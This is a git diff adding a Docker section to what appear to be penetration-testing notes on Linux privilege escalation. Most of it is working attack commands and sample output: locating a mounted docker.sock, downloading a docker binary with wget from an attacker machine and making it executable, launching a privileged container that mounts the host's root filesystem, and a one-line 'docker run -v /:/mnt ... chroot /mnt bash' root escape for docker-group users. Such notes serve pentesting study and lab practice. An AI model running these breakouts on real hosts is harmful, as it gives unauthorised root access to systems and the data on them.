@@ -218,3 +218,47 @@ $ lxc exec privesc /bin/bash
 # to access the contents of the root directory on the host type cd /mnt/root/root
 
 ```
+### Docker 
+check [hacktricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)
+
+#### Mounted Docker Socket privesc
+suppose we are on a docker container and we want to break out to the system and get root access 
+```shell
+#Search the socket
+find / -name docker.sock 2>/dev/null
+#It's usually in /run/docker.sock
+```
+install [docker](https://master.dockerproject.org/linux/x86_64/docker)
+```shell
+/tmp$ wget https://<parrot-os>:443/docker -O docker
+/tmp$ chmod +x docker
+/tmp$ /tmp/docker -H unix:///app/docker.sock ps
+
+CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
+3fe8a4782311     main_app      "/docker-entry.s..."    3 days ago    Up 12 minutes    443/tcp   app
+```
+We can create our own Docker container that maps the host’s root directory (/) to the /hostsystem directory on the container
+```shell
+# we must use the same image we are on it
+/tmp$ /tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
+
+# log in to the new privileged Docker container with the ID 7ae3bcc818af and navigate to the /hostsystem.
+/tmp$ /tmp/docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash
+
+```
+
+#### Docker host system privesc
+- user we are logged in with must be in the docker group.
+- Docker may have SUID set, or we are in the Sudoers file, which permits us to run docker as root.
+```shell
+id
+
+docker image ls
+
+REPOSITORY                           TAG                 IMAGE ID       CREATED         SIZE
+ubuntu                               20.04               20fffa419e3a   2 days ago    72.8MB
+```
+
+```shell
+docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
+```
